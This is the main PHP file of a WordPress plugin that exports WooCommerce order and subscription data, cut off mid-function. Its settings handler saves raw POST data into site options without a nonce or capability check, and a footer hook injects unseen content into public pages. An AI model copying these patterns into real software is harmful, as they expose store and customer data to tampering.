<?php
/*
Plugin Name: SV WooCommerce Order Export
Plugin URI: https://straightvisions.com/products/sv-woocommerce-order-export/
Description: Exports WooCommerce Order Data
Version: 1.0.7
Author: Matthias Reuter
Author URI: https://straightvisions.com
*/

// deactivate error output if not explicite activated
if(!defined('WP_DEBUG_DISPLAY')){
	define('WP_DEBUG_DISPLAY', false);
}

define('SV_WOOCOMMERCE_ORDER_EXPORT_DIR',WP_PLUGIN_DIR.'/'.dirname(plugin_basename(__FILE__)).'/');
define('SV_WOOCOMMERCE_ORDER_EXPORT_PLUGIN_URL',plugins_url( '' , __FILE__ ).'/');
define('SV_WOOCOMMERCE_ORDER_EXPORT_VERSION', 1007);

class sv_woocommerce_order_export{
	private	$module											= false;
	private $orders											= array();
	private $products										= array();
	private $stats											= NULL;
	private $default_export_fields							= array('fields' => array(
																'order_id'							=> array('name' => 'order_id', 'active' => 1),
																'invoice_id'						=> array('name' => 'invoice_id', 'active' => 0),
																'order_date'						=> array('name' => 'order_date', 'active' => 1),
																'billing_first_name'				=> array('name' => 'billing_first_name', 'active' => 1),
																'billing_last_name'					=> array('name' => 'billing_last_name', 'active' => 1),
																'billing_full_name'					=> array('name' => 'billing_full_name', 'active' => 0),
																'billing_email'						=> array('name' => 'billing_email', 'active' => 1),
																'billing_phone'						=> array('name' => 'billing_phone', 'active' => 1),
																'billing_address_1'					=> array('name' => 'billing_address_1', 'active' => 1),
																'billing_address_2'					=> array('name' => 'billing_address_2', 'active' => 1),
																'billing_full_address'				=> array('name' => 'billing_full_address', 'active' => 0),
																'billing_postcode'					=> array('name' => 'billing_postcode', 'active' => 1),
																'billing_city'						=> array('name' => 'billing_city', 'active' => 1),
																'billing_country'					=> array('name' => 'billing_country', 'active' => 1),
																'shipping_first_name'				=> array('name' => 'shipping_first_name', 'active' => 1),
																'shipping_last_name'				=> array('name' => 'shipping_last_name', 'active' => 1),
																'shipping_full_name'				=> array('name' => 'shipping_full_name', 'active' => 0),
																'shipping_email'					=> array('name' => 'shipping_email', 'active' => 1),
																'shipping_address_1'				=> array('name' => 'shipping_address_1', 'active' => 1),
																'shipping_address_2'				=> array('name' => 'shipping_address_2', 'active' => 1),
																'shipping_full_address'				=> array('name' => 'shipping_full_address', 'active' => 0),
																'shipping_postcode'					=> array('name' => 'shipping_postcode', 'active' => 1),
																'shipping_city'						=> array('name' => 'shipping_city', 'active' => 1),
																'shipping_country'					=> array('name' => 'shipping_country', 'active' => 1),
																'order_comments'					=> array('name' => 'order_comments', 'active' => 1),
																'total'								=> array('name' => 'total', 'active' => 1),
																'total_tax'							=> array('name' => 'total_tax', 'active' => 1),
																'items_ids'							=> array('name' => 'items_ids', 'active' => 1),
																'items_name'						=> array('name' => 'items_name', 'active' => 1),
																'items_author'						=> array('name' => 'items_author', 'active' => 1),
																'items_meta'						=> array('name' => 'items_meta', 'active' => 1),
																'items_quantity'					=> array('name' => 'items_quantity', 'active' => 1),
																'items_totals'						=> array('name' => 'items_totals', 'active' => 1),
																'items_totals_tax'					=> array('name' => 'items_totals_tax', 'active' => 1),
																'items_totals_tax_percent'			=> array('name' => 'items_totals_tax_percent', 'active' => 1),
																'items_sku'							=> array('name' => 'items_sku', 'active' => 1),
																'items_link'						=> array('name' => 'items_link', 'active' => 1),
																'items_total_sales'					=> array('name' => 'items_total_sales', 'active' => 0),
																'order_status'						=> array('name' => 'order_status', 'active' => 1),
																'payment_method'					=> array('name' => 'payment_method', 'active' => 1),
																'download_permissions_granted'		=> array('name' => 'download_permissions_granted', 'active' => 0),
															));
	private $default_subscriptions_fields					= array('fields' => array(
																'subscription_id'								=> array('name' => 'subscription_id', 'active' => 1),
																'subscription_parent_order'						=> array('name' => 'subscription_parent_order', 'active' => 1),
																'subscription_user_email'						=> array('name' => 'subscription_user_email', 'active' => 1),
																'subscription_name'								=> array('name' => 'name', 'active' => 1),
																'subscription_product_id'						=> array('name' => 'product_id', 'active' => 1),
																'subscription_variation_id'						=> array('name' => 'variation_id', 'active' => 1),
																'subscription_total'							=> array('name' => 'total', 'active' => 1),
																'subscription_tax'								=> array('name' => 'tax', 'active' => 1),
																'subscription_has_trial'						=> array('name' => 'has_trial', 'active' => 1),
																'subscription_status'							=> array('name' => 'status', 'active' => 1),
																'subscription_failed_payment_count'				=> array('name' => 'failed_payment_count', 'active' => 1),
																'subscription_completed_payment_count'			=> array('name' => 'completed_payment_count', 'active' => 1),
																'subscription_needs_payment'					=> array('name' => 'needs_payment', 'active' => 1),
																'subscription_start_date'						=> array('name' => 'start_date', 'active' => 1),
																'subscription_end_date'							=> array('name' => 'end_date', 'active' => 1),
																'subscription_trial_end_date'					=> array('name' => 'trial_end_date', 'active' => 1),
																'subscription_next_payment_date'				=> array('name' => 'next_payment_date', 'active' => 1),
																'subscription_last_payment_date'				=> array('name' => 'last_payment_date', 'active' => 1),
																'subscription_is_download_permitted'			=> array('name' => 'is_download_permitted', 'active' => 1),
																'subscription_sign_up_fee'						=> array('name' => 'sign_up_fee', 'active' => 1),
																'subscription_payment_method'					=> array('name' => 'subscription_payment_method', 'active' => 1),
															));

	private $global_settings								= false;
	private $global_filter									= false;
	private $user_settings									= false;
	private $global_filter_available						= array();
	private $global_subscriptions_settings					= false;
	private $user_subscriptions_settings					= false;
	private $stepping										= 200;

	public function __construct(){
		header('SV-WooCommerce-Order-Export: '.SV_WOOCOMMERCE_ORDER_EXPORT_VERSION);
		
		require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'/lib/common/stats.inc.php');
		$this->stats			= new sv_woocommerce_order_export_stats();
		
		register_activation_hook(__FILE__,array($this,'install'));
		register_deactivation_hook(__FILE__,array($this,'uninstall'));
		add_action('admin_init', array($this,'admin_init'));
		add_action('admin_menu', array($this, 'get_settings_menu'));
		add_action('admin_enqueue_scripts', array($this, 'admin_scripts'));
		add_action('wp_footer', array($this,'c')); // copyright notice for some competitors. Removing this violates license agreement and disallow you to further use this software.
		add_filter('plugin_action_links', array($this,'plugin_action_links'), 10, 5);
	}
	// init
	public function admin_init(){
		if(intval(get_option('sv_woocommerce_order_export_version')) < SV_WOOCOMMERCE_ORDER_EXPORT_VERSION){
			// 1.0.3
			if(intval(get_option('sv_woocommerce_order_export_version')) < 1003){
				$this->add_capabilities(); // update caps
			}
			// 1.0.4
			if(intval(get_option('sv_woocommerce_order_export_version')) < 1004){
				$new_format = array('fields' => unserialize(get_option('sv_woocommerce_order_export_settings')));
				update_option('sv_woocommerce_order_export_settings', $new_format, false);
				
				update_option('sv_woocommerce_order_export_filter',unserialize(get_option('sv_woocommerce_order_export_filter')));
				update_option('sv_woocommerce_order_export_subscriptions_settings',unserialize(get_option('sv_woocommerce_order_export_subscriptions_settings')));
			}
				
			update_option('sv_woocommerce_order_export_version', SV_WOOCOMMERCE_ORDER_EXPORT_VERSION, true);
		}
		
		$this->update_field_settings();
		$this->scan_filter_available();
		$this->get_global_filter();
		$this->export();
		$this->dashboard_widgets();
	}
	public function admin_scripts(){
		wp_enqueue_script('sv_woocommerce_order_export', SV_WOOCOMMERCE_ORDER_EXPORT_PLUGIN_URL.'lib/js/scripts.js', array('jquery', 'jquery-ui-core', 'jquery-ui-sortable'), SV_WOOCOMMERCE_ORDER_EXPORT_VERSION);
		wp_enqueue_style('sv_woocommerce_order_export', SV_WOOCOMMERCE_ORDER_EXPORT_PLUGIN_URL.'lib/css/style.css', false, SV_WOOCOMMERCE_ORDER_EXPORT_VERSION);
	}
	// install/uninstall
	public function install(){
		$this->add_capabilities();
	}
	public function uninstall(){
		$this->remove_capabilities();
	}
	private function add_capabilities(){
		$roles = array(
			'administrator'
		);

		$roles[] = apply_filters('sv_woocommerce_order_export_roles', $roles);

		foreach($roles as $role){
			$r = get_role($role);
			if($r){
				$r->add_cap('sv_woocommerce_order_export',true);
				$r->add_cap('sv_woocommerce_order_export_subscriptions',true);
			}
		}
	}
	private function remove_capabilities(){
		$roles = array(
			'administrator',
			'editor',
			'author',
			'contributor',
		);

		$roles = apply_filters('sv_woocommerce_order_export_roles', $roles);

		foreach($roles as $role){
			$r = get_role($role);
			if ($r){
				$r->remove_cap('sv_woocommerce_order_export');
			}
		}
	}
	// setter/getter
	public function set_order($id,$full=false){
		$this->orders[$id]['order']			= new WC_Order($id);
		if($full){
			$this->orders[$id]['items']		= $this->orders[$id]['order']->get_items();
		}else{
			$this->orders[$id]['items']		= false;
		}
	}
	public function get_order($id,$full=false){
		if(isset($this->orders[$id]['order']) && is_object($this->orders[$id]['order'])){
			return $this->orders[$id]['order'];
		}else{
			$this->set_order($id,$full);
			return $this->orders[$id]['order'];
		}
	}
	public function get_orders(){
		return $this->orders;
	}
	public function get_subscriptions(){
		return $this->get_all_subscriptions();
	}
	public function get_order_items($id){
		if(isset($this->orders[$id]['items']) && is_array($this->orders[$id]['items'])){
			return $this->orders[$id]['items'];
		}else{
			return false;
		}
	}
	public function get_item_variation_id_by_item_id($item){
		return (intval($item['variation_id'] > 0) ? $item['variation_id'] : $item['product_id']);
	}
	public function set_product($id){
		$this->products[$id]				= new WC_Product($id);
	}
	public function get_product($id){
		if(isset($this->products[$id]) && is_object($this->products[$id])){
			return $this->products[$id];
		}else{
			$this->set_product($id);
			return $this->products[$id];
		}
	}
	// settings
	public function get_default_export_fields(){
		return apply_filters('sv_woocommerce_order_export_get_default_export_fields',$this->default_export_fields);
	}
	public function get_default_subscriptions_export_fields(){
		return apply_filters('sv_woocommerce_order_export_get_default_subscriptions_export_fields',$this->default_subscriptions_fields);
	}
	public function get_settings_menu(){
		$domain = 'sv_woocommerce_order_export';
		$locale = apply_filters('plugin_locale', get_locale(), $domain);
		$custom_lang_dir = WP_LANG_DIR.'/plugins/'.$domain.'-'.$locale.'.mo';
		load_textdomain($domain, $custom_lang_dir);
		load_plugin_textdomain($domain, FALSE, dirname(plugin_basename(__FILE__)). '/lib/translate/');
		
		add_menu_page(
			__('User Settings', 'sv_woocommerce_order_export'),							// page title
			__('Order Export', 'sv_woocommerce_order_export'),							// menu title
			'sv_woocommerce_order_export',												// capability
			'sv_woocommerce_order_export_user_settings',								// menu slug
			array($this,'get_user_settings_tpl'),										// callable function
			plugins_url('',__FILE__ ).'/lib/img/logo_icon.png'							// icon url
		);
		add_submenu_page(
			'sv_woocommerce_order_export_user_settings',								// parent slug
			__('Global Settings', 'sv_woocommerce_order_export'),						// page title
			__('Global Settings', 'sv_woocommerce_order_export'),						// menu title
			'activate_plugins',															// capability
			'sv_woocommerce_order_export_global_settings',								// menu slug
			array($this,'get_global_settings_tpl')										// callable function
		);
		add_submenu_page(
			'sv_woocommerce_order_export_user_settings',								// parent slug
			__('Global Filters', 'sv_woocommerce_order_export'),						// page title
			__('Global Filters', 'sv_woocommerce_order_export'),						// menu title
			'activate_plugins',															// capability
			'sv_woocommerce_order_export_global_filters',								// menu slug
			array($this,'get_global_filters_tpl')										// callable function
		);
		if(class_exists('WC_Subscriptions')){
			add_submenu_page(
				'sv_woocommerce_order_export_user_settings',							// parent slug
				__('Subscriptions: Global Settings', 'sv_woocommerce_order_export'),	// page title
				__('Subscriptions: Global Settings', 'sv_woocommerce_order_export'),	// menu title
				'activate_plugins',														// capability
				'sv_woocommerce_order_export_subscriptions_global_settings',			// menu slug
				array($this,'get_subscriptions_global_settings_tpl')					// callable function
			);
			add_submenu_page(
				'sv_woocommerce_order_export_user_settings',							// parent slug
				__('Subscriptions: User Settings', 'sv_woocommerce_order_export'),		// page title
				__('Subscriptions: User Settings', 'sv_woocommerce_order_export'),		// menu title
				'sv_woocommerce_order_export_subscriptions',							// capability
				'sv_woocommerce_order_export_subscriptions_user_settings',				// menu slug
				array($this,'get_subscriptions_user_settings_tpl')						// callable function
			);
		}
	}
	public function plugin_action_links($actions, $plugin_file){
		static $plugin;
		if(!isset($plugin)){
			$plugin = plugin_basename(__FILE__);
		}
		if($plugin == $plugin_file){
			$settings = array('user_settings' => '<a href="admin.php?page=sv_woocommerce_order_export_user_settings">'.__('User Settings', 'sv_woocommerce_order_export').'</a> | <a href="admin.php?page=sv_woocommerce_order_export_global_settings">'.__('Global Settings', 'sv_woocommerce_order_export').'</a> | <a href="admin.php?page=sv_woocommerce_order_export_global_filters" target="_blank">'.__('Global Filters', 'sv_woocommerce_order_export').'</a>');
			$site_link = array('support' => '<a href="http://codecanyon.net/item/sv-woocommerce-order-export/15402617/support" target="_blank">'.__('Support', 'sv_woocommerce_order_export').'</a>');
			$actions = array_merge_recursive($settings, $actions);
			$actions = array_merge_recursive($site_link, $actions);
		}
		return $actions;
	}
	public function get_user_settings_tpl(){
		require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/user_settings.php');
	}
	public function get_global_settings_tpl(){
		require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/global_settings.php');
	}
	public function get_global_filters_tpl(){
		require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/global_filters.php');
	}
	public function get_subscriptions_global_settings_tpl(){
		require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/subscriptions_global_settings.php');
	}
	public function get_subscriptions_user_settings_tpl(){
		require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/subscriptions_user_settings.php');
	}
	public function update_field_settings(){
		if(isset($_POST['sv_woocommerce_order_export_setting_group'])){
			if($_POST['sv_woocommerce_order_export_setting_group'] == 'global_settings'){
				update_option('sv_woocommerce_order_export_settings', $_POST, false);
			}elseif($_POST['sv_woocommerce_order_export_setting_group'] == 'user_settings'){
				update_user_option(get_current_user_id(), 'sv_woocommerce_order_export_settings', $_POST);
			}elseif($_POST['sv_woocommerce_order_export_setting_group'] == 'global_filters'){
				update_option('sv_woocommerce_order_export_filter', $_POST['sv_woocommerce_order_export_filter'], false);
			}elseif($_POST['sv_woocommerce_order_export_setting_group'] == 'subscriptions_global_settings'){
				update_option('sv_woocommerce_order_export_subscriptions_settings', $_POST['sv_woocommerce_order_export_settings'], false);
			}elseif($_POST['sv_woocommerce_order_export_setting_group'] == 'subscriptions_user_settings'){
				update_user_option(get_current_user_id(), 'sv_woocommerce_order_export_subscriptions_settings', $_POST);
			}
		}
	}
	public function get_global_settings(){
		if($this->global_settings){
			return $this->global_settings;
		}elseif($settings = get_option('sv_woocommerce_order_export_settings')){
			if(is_array($settings['fields'])){
				$this->global_settings = array_merge_recursive($this->get_default_export_fields(),$settings);
				return $this->global_settings;
			}else{
				return $this->get_default_export_fields();
			}
		}else{
			return $this->get_default_export_fields();
		}
	}
	public function get_global_filter(){
		if($this->global_filter){
			return $this->global_filter;
		}elseif($filter = get_option('sv_woocommerce_order_export_filter')){
			$this->global_filter = $filter;
			if($this->global_filter){
				foreach($this->global_filter as $filter_id => $filter_active){
					require_once($this->global_filter_available[$filter_id]['path']);
					$this->filters_loaded[$filter_id]			= new $this->global_filter_available[$filter_id]['class'];
				}
			}
			return $this->global_filter;
		}else{
			return $this->get_default_export_fields();
		}
	}
	public function get_user_settings(){
		if($this->user_settings){
			return $this->user_settings;
		}elseif(is_array(get_user_option('sv_woocommerce_order_export_settings')) && $this->user_settings = array_merge_recursive(get_user_option('sv_woocommerce_order_export_settings'),array_merge_recursive($this->get_default_export_fields(),get_user_option('sv_woocommerce_order_export_settings')))){
			// merge multiple fields to string
			foreach($this->user_settings['fields'] as $field_id => $field){
					$this->user_settings['fields'][$field_id]['name']		= $field['name'][(count($field['name'])-1)];
					$this->user_settings['fields'][$field_id]['active']		= $field['active'][(count($field['active'])-1)];
			}
			return $this->user_settings;
		}else{
			return $this->get_default_export_fields();
		}
	}
	public function get_subscriptions_global_settings(){
		if($this->global_subscriptions_settings){
			return $this->global_subscriptions_settings;
		}elseif(get_option('sv_woocommerce_order_export_subscriptions_settings') && $this->global_subscriptions_settings = array_merge_recursive($this->get_default_subscriptions_export_fields(),(array)get_option('sv_woocommerce_order_export_subscriptions_settings'))){
			return $this->global_subscriptions_settings;
		}else{
			return $this->get_default_subscriptions_export_fields();
		}
	}
	public function get_subscriptions_user_settings(){
		if($this->user_subscriptions_settings){
			return $this->user_subscriptions_settings;
		}elseif(get_user_option('sv_woocommerce_order_export_subscriptions_settings') && $this->user_subscriptions_settings = array_merge_recursive(get_user_option('sv_woocommerce_order_export_subscriptions_settings'),array_merge_recursive($this->get_default_subscriptions_export_fields(),get_user_option('sv_woocommerce_order_export_subscriptions_settings')))){
			// merge multiple fields to string
			foreach($this->user_subscriptions_settings['fields'] as $field_id => $field){
					$this->user_subscriptions_settings['fields'][$field_id]['name']			= $field['name'][(count($field['name'])-1)];
					$this->user_subscriptions_settings['fields'][$field_id]['active']		= $field['active'][(count($field['active'])-1)];
			}
			return $this->user_subscriptions_settings;
		}else{
			return $this->get_default_subscriptions_export_fields();
		}
	}
	public function is_userfield_forced_hidden($field_id){
		$s = $this->get_global_settings();
		if(isset($s['fields'][$field_id]['status']) && $s['fields'][$field_id]['status'] == 'hide'){
			return true;
		}else{
			return false;
		}
	}
	public function is_userfield_forced_active($field_id){
		$s = $this->get_global_settings();
		if(isset($s['fields'][$field_id]['status']) && $s['fields'][$field_id]['status'] == 'show'){
			return true;
		}else{
			return false;
		}
	}
	public function is_subscriptions_userfield_forced_hidden($field_id){
		$s = $this->get_subscriptions_global_settings();
		if(isset($s['fields'][$field_id]['status']) && $s['fields'][$field_id]['status'] == 'hide'){
			return true;
		}else{
			return false;
		}
	}
	public function is_subscriptions_userfield_forced_active($field_id){
		$s = $this->get_subscriptions_global_settings();
		if(isset($s['fields'][$field_id]['status']) && $s['fields'][$field_id]['status'] == 'show'){
			return true;
		}else{
			return false;
		}
	}
	public function export_field_visible($field_id, $field_settings){
		// forced visible?
		if(isset($_POST['subscriptions'])){ // subscriptions
			if($this->is_subscriptions_userfield_forced_active($field_id)){
				return true;
			}elseif($this->is_subscriptions_userfield_forced_hidden($field_id)){
				return false;
			}else{
				return (bool) $field_settings['active'];
			}
		}else{ // orders
			if($this->is_userfield_forced_active($field_id)){
				return true;
			}elseif($this->is_userfield_forced_hidden($field_id)){
				return false;
			}else{
				return (bool) $field_settings['active'];
			}
		}
	}
	// widgets
	public function dashboard_widgets(){
		if(current_user_can('sv_woocommerce_order_export')){
			add_meta_box('sv_woocommerce_order_export_get_stats_current_month', __('Orders Current Month', 'sv_woocommerce_order_export'), array($this,'widget_current_month'), 'dashboard', 'side', 'high');
			add_meta_box('sv_woocommerce_order_export_get_stats_last_month', __('Orders Last Month', 'sv_woocommerce_order_export'), array($this,'widget_last_month'), 'dashboard', 'normal', 'high');
			add_meta_box('sv_woocommerce_order_export_get_custom_export', __('Export Orders', 'sv_woocommerce_order_export'), array($this,'widget_get_custom_export'), 'dashboard', 'normal', 'high');
			// subscriptions
			if(function_exists('wcs_get_subscriptions')){
				add_meta_box('sv_woocommerce_order_export_get_subscription_export', __('Export Subscriptions', 'sv_woocommerce_order_export'), array($this,'widget_get_subscription_export'), 'dashboard', 'normal', 'high');
			}
		}else{
			remove_meta_box( 'woocommerce_dashboard_status', 'dashboard', 'normal');//since 3.8
		}
	}
	public function widget_current_month(){
		$this->get_widget_tpl($this->get_all_orders_current_month(apply_filters('sv_woocommerce_order_export_trigger_full',false)),'current_month',date('Ym'));
	}
	public function widget_last_month(){
		$this->get_widget_tpl($this->get_all_orders_last_month(apply_filters('sv_woocommerce_order_export_trigger_full',false)),'last_month',date('Ym', mktime(0, 0, 0, date('m')-1, 1, date('Y'))));
	}
	// templates
	private function get_widget_tpl($data,$date_range,$date=false){
		if(file_exists(get_stylesheet_directory().'/sv_woocommerce_order_export/tpl/get_monthly_export.php')){
			include(get_stylesheet_directory().'/sv_woocommerce_order_export/tpl/get_monthly_export.php');
		}else{
			include(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/get_monthly_export.php');
		}
	}
	public function widget_get_custom_export(){
		if(file_exists(get_stylesheet_directory().'/sv_woocommerce_order_export/tpl/get_custom_export.php')){
			include(get_stylesheet_directory().'/sv_woocommerce_order_export/tpl/get_custom_export.php');
		}else{
			include(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/get_custom_export.php');
		}
	}
	public function widget_get_subscription_export(){
		if(file_exists(get_stylesheet_directory().'/sv_woocommerce_order_export/tpl/get_subscriptions_export.php')){
			include(get_stylesheet_directory().'/sv_woocommerce_order_export/tpl/get_subscriptions_export.php');
		}else{
			include(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/tpl/get_subscriptions_export.php');
		}
	}
	// queries
	private function get_all_orders_current_month($full=false){
		global $wpdb;

		$transient						= 'current_month';
		$query							= 'SELECT * FROM '.$wpdb->prefix.'posts WHERE YEAR(post_date) = YEAR(NOW()) AND MONTH(post_date) = MONTH(NOW()) AND post_type="shop_order" ORDER BY ID ASC';

		// get all orders of the current month
		if(!$full){
			$offset						= $this->prepare_stats($transient);
			$results					= $wpdb->get_results($query.' LIMIT '.($offset ? intval($offset) : 0).', '.$this->stepping.'', ARRAY_A);
			
			if($results && count($results) > 0){ // new orders found
				$orders					= $this->get_order_objects($results,$full,$transient);
				$this->process_stats($transient,$offset);
				return $orders;
			}
		}else{
			return $this->get_order_objects($wpdb->get_results($query, ARRAY_A),$full,$transient);
		}
	}
	private function get_all_orders_last_month($full=false){
		global $wpdb;

		$transient						= 'last_month';
		$query							= 'SELECT * FROM '.$wpdb->prefix.'posts WHERE YEAR(post_date) = YEAR(CURRENT_DATE - INTERVAL 1 MONTH) AND MONTH(post_date) = MONTH(CURRENT_DATE - INTERVAL 1 MONTH) AND post_type="shop_order" ORDER BY ID ASC';

		// get all orders of the last month
		if(!$full){
			$offset						= $this->prepare_stats($transient);
			$results					= $wpdb->get_results($query.' LIMIT '.($offset ? intval($offset) : 0).', '.$this->stepping.'', ARRAY_A);

			if($results && count($results) > 0){ // new orders found
				$orders					= $this->get_order_objects($results,$full,$transient);
				$this->process_stats($transient,$offset);
				return $orders;
			}
		}else{
			return $this->get_order_objects($wpdb->get_results($query, ARRAY_A),$full,$transient);
		}
	}
	private function prepare_stats($transient){
		$offset = get_transient('sv_woocommerce_order_export_query_'.$transient.'_offset');

		if(!$offset || $offset == ''){ // once transient is invalidated, empty stats cache
			$this->stats->reset_transient($transient);
		}
		
		return $offset;
	}
	private function process_stats($transient,$offset){
		echo '<p>'.__('calculating stats...', 'sv_woocommerce_order_export').'</p>';
		update_option('sv_woocommerce_order_export_stats',$this->stats->get_stats());
		set_transient('sv_woocommerce_order_export_query_'.$transient.'_offset', $offset+$this->stepping, HOUR_IN_SECONDS*24);
	}
	private function get_all_orders_custom_range($from,$to){
		global $wpdb;

		// security check
		$check_from = date_parse_from_format("Y-n-j",$from);
		$check_to = date_parse_from_format("Y-n-j",$to);
		if($check_from['year'] > 0 && $check_from['month'] > 0 && $check_from['day'] > 0 && $check_to['year'] > 0 && $check_to['month'] > 0 && $check_to['day'] > 0){
			// get all orders of given date range
			$query = 'SELECT * FROM '.$wpdb->prefix.'posts WHERE (post_date BETWEEN "'.intval($check_from['year']).'-'.intval($check_from['month']).'-'.intval($check_from['day']).'" AND "'.intval($check_to['year']).'-'.intval($check_to['month']).'-'.intval($check_to['day']).'") AND post_type="shop_order" ORDER BY ID ASC;';
			return $this->get_order_objects($wpdb->get_results($query, ARRAY_A),true);
		}
	}
	/**
	 * A general purpose function for grabbing an array of subscriptions in form of post_id => WC_Subscription
	 *
	 * The $args parameter is based on the parameter of the same name used by the core WordPress @see get_posts() function.
	 * It can be used to choose which subscriptions should be returned by the function, how many subscriptions should be returned
	 * and in what order those subscriptions should be returned.
	 *
	 * @param array $args A set of name value pairs to determine the return value.
	 *		'subscriptions_per_page' The number of subscriptions to return. Set to -1 for unlimited. Default 10.
	 *		'offset' An optional number of subscription to displace or pass over. Default 0.
	 *		'orderby' The field which the subscriptions should be ordered by. Can be 'start_date', 'trial_end_date', 'end_date', 'status' or 'order_id'. Defaults to 'start_date'.
	 *		'order' The order of the values returned. Can be 'ASC' or 'DESC'. Defaults to 'DESC'
	 *		'customer_id' The user ID of a customer on the site.
	 *		'product_id' The post ID of a WC_Product_Subscription, WC_Product_Variable_Subscription or WC_Product_Subscription_Variation object
	 *		'order_id' The post ID of a shop_order post/WC_Order object which was used to create the subscription
	 *		'subscription_status' Any valid subscription status. Can be 'any', 'active', 'cancelled', 'suspended', 'expired', 'pending' or 'trash'. Defaults to 'any'.
	 * @return array Subscription details in post_id => WC_Subscription form.
	 */
	private function get_all_subscriptions(){
		$args																				= array(
			'subscriptions_per_page'														=> -1,
			'paged'																			=> 0,
			'offset'																		=> 0,
			'orderby'																		=> 'start_date',
			'order'																			=> 'DESC',/*
			'customer_id'																	=> 0,
			'product_id'																	=> 0,
			'variation_id'																	=> 0,
			'order_id'																		=> 0,
			'meta_query_relation'															=> 'AND',*/
			'subscription_status'															=> $_POST['status'],
		);
		foreach(wcs_get_subscriptions($args) as $subscription){
			$items																						= reset($subscription->get_items());

			$subscriptions[$subscription->order->id]['subscription_id']									= $subscription->id;
			$subscriptions[$subscription->order->id]['subscription_parent_order']						= $subscription->order->id;
			$subscriptions[$subscription->order->id]['subscription_user_email']							= $subscription->order->billing_email;
			$subscriptions[$subscription->order->id]['subscription_name']								= $items['name'];
			$subscriptions[$subscription->order->id]['subscription_product_id']							= $items['product_id'];
			$subscriptions[$subscription->order->id]['subscription_variation_id']						= $items['variation_id'];
			$subscriptions[$subscription->order->id]['subscription_total']								= $items['line_total'];
			$subscriptions[$subscription->order->id]['subscription_tax']								= $items['line_tax'];
			$subscriptions[$subscription->order->id]['subscription_has_trial']							= $items['has_trial'];
			$subscriptions[$subscription->order->id]['subscription_status']								= $subscription->get_status();
			$subscriptions[$subscription->order->id]['subscription_failed_payment_count']				= $subscription->get_failed_payment_count();
			$subscriptions[$subscription->order->id]['subscription_completed_payment_count']			= $subscription->get_completed_payment_count();
			$subscriptions[$subscription->order->id]['subscription_needs_payment']						= $subscription->needs_payment();
			$subscriptions[$subscription->order->id]['subscription_start_date']							= $subscription->__get('start_date');
			$subscriptions[$subscription->order->id]['subscription_end_date']							= $subscription->__get('end_date');
			$subscriptions[$subscription->order->id]['subscription_trial_end_date']						= $subscription->__get('trial_end_date');
			$subscriptions[$subscription->order->id]['subscription_next_payment_date']					= $subscription->calculate_date('next_payment');
			$lastPaymentDate																			= $subscription->get_last_order('all');
			$subscriptions[$subscription->order->id]['subscription_last_payment_date']					= $lastPaymentDate->post->post_date_gmt;
			$subscriptions[$subscription->order->id]['subscription_is_download_permitted']				= $subscription->is_download_permitted();
			$subscriptions[$subscription->order->id]['subscription_sign_up_fee']						= $subscription->get_sign_up_fee();
		}
		
		return $subscriptions;
	}
	// gather additional data
	private function get_order_objects($orders,$full=false,$transient=false){
		// get order products
		foreach($orders as $order_data){
			set_time_limit(60);
			$order			= $this->get_order($order_data['ID'],$full);
			$items			= $this->get_order_items($order_data['ID']);
			$total			= apply_filters('sv_woocommerce_order_export_get_order_objects_stats_total',$order->get_total(),$order,$items,$this);
			
			$this->stats->set_stats($transient,'common',false,'total',$total,'add');
			$this->stats->set_stats($transient,'post_status',$order->post->post_status,'total',$total,'add');
			$this->stats->set_stats($transient,'post_status',$order->post->post_status,'orders',1,'add');
		}
		$this->stats->set_stats($transient,'common',false,'orders',count($orders));
	}
	// export
	private function export_get_orders(){
		set_time_limit(600);
		ini_set('memory_limit','2048M');
		if(isset($_POST['date_range']) && empty($_POST['subscriptions'])){
			if($_POST['date_range'] == 'current_month'){
				$this->get_all_orders_current_month(true);
			}elseif($_POST['date_range'] == 'last_month'){
				$this->get_all_orders_last_month(true);
			}elseif($_POST['date_range'] == 'custom_export'){
				$this->get_all_orders_custom_range($_POST['datepicker_from'],$_POST['datepicker_to']);
			}else{
				die('unknown date range given');
			}
		}elseif(isset($_POST['subscriptions'])){
			if($_POST['subscriptions'] == 'all'){
				$this->get_subscriptions();
			}
		}else{
			die('no date range given');
		}
	}
	public function export(){
		if(isset($_POST['sv_woocommerce_order_export']) && wp_verify_nonce($_POST['sv_woocommerce_order_export'],'sv_woocommerce_order_export')){
			global $wpdb;
			
			$this->export_get_orders();

			// @todo: support different export modules
			if($_POST['type'] == 'excel'){
				require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/modules/excel.inc.php');
			}elseif($_POST['type'] == 'csv'){
				require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/modules/csv.inc.php');
			}elseif($_POST['type'] == 'xml'){
				require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/modules/xml.inc.php');
			}elseif($_POST['type'] == 'json'){
				require_once(SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/modules/json.inc.php');
			}
			$this->module		= $module;
			
			$this->module->build($this);
		}
	}
	// filter
	private function scan_filter_available(){
		$default_headers = array(
			'name'									=> 'Filter Name',
			'uri'									=> 'Filter URI',
			'desc'									=> 'Description',
			'version'								=> 'Version',
			'author'								=> 'Author',
			'author_uri'							=> 'Author URI',
			'class'									=> 'Class Name'
		);
		
		// original filter
		$dir = SV_WOOCOMMERCE_ORDER_EXPORT_DIR.'lib/filter/';
		if($files = scandir($dir)){
			foreach($files as $file){
				if($file != '.' && $file != '..'){
					$data = get_file_data($dir.$file,$default_headers);
					$this->global_filter_available[$data['class']]			= $data;
					$this->global_filter_available[$data['class']]['path']	= $dir.$file;
				}
			}
		}
		
		// custom filter
		$dir = get_stylesheet_directory().'/sv_woocommerce_order_export/filter/';
		if(is_dir($dir) && $files = scandir($dir)){
			foreach($files as $file){
				if($file != '.' && $file != '..'){
					$data = get_file_data($dir.$file,$default_headers);
					$this->global_filter_available[$data['class']]	= $data;
